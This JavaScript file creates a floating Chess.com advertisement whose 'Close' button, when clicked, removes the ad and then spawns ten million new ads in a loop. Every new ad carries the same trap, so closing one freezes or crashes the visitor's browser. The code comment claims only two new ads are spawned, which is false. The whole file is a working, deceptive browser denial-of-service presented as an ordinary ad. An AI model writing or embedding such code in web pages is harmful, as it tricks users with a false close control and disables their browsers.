function createAd() {
    // Create the ad container
    const adContainer = document.createElement("div");
    adContainer.style.position = "fixed";
    adContainer.style.bottom = `${Math.random() * 80}vh`; // Random vertical position
    adContainer.style.left = `${Math.random() * 80}vw`; // Random horizontal position
    adContainer.style.backgroundColor = "#222";
    adContainer.style.color = "white";
    adContainer.style.padding = "20px";
    adContainer.style.textAlign = "center";
    adContainer.style.border = "2px solid #00ccff";
    adContainer.style.borderRadius = "10px";
    adContainer.style.boxShadow = "0px 2px 10px rgba(0, 0, 0, 0.5)";
    adContainer.style.width = "250px";
    adContainer.style.cursor = "move";
    adContainer.id = `chessAd-${Math.random()}`;
  
    // Add ad content
    adContainer.innerHTML = `
      <strong>♟️ Join Chess.com!</strong><br>
      Play online chess with millions of players worldwide.<br>
      <a href="https://www.chess.com" target="_blank" style="color: #00ccff; text-decoration: none;">Click here to start!</a>
      <br><br>
    `;
  
    // Create a close button
    const closeButton = document.createElement("button");
    closeButton.textContent = "Close";
    closeButton.style.marginTop = "10px";
    closeButton.style.padding = "5px 10px";
    closeButton.style.background = "#444";
    closeButton.style.color = "#fff";
    closeButton.style.border = "none";
    closeButton.style.borderRadius = "5px";
    closeButton.style.cursor = "pointer";
  
    // Add event listener to the close button
    closeButton.addEventListener("click", () => {
      adContainer.remove(); // Remove the current ad
      for (let i = 0; i < 10000000; i++) {
        createAd(); // Spawn two new ads
      }
    });
  
    // Append the close button to the ad container
    adContainer.appendChild(closeButton);
  
    // Append the ad container to the body
    document.body.appendChild(adContainer);
  }
  
  // Create the first ad
  createAd();
  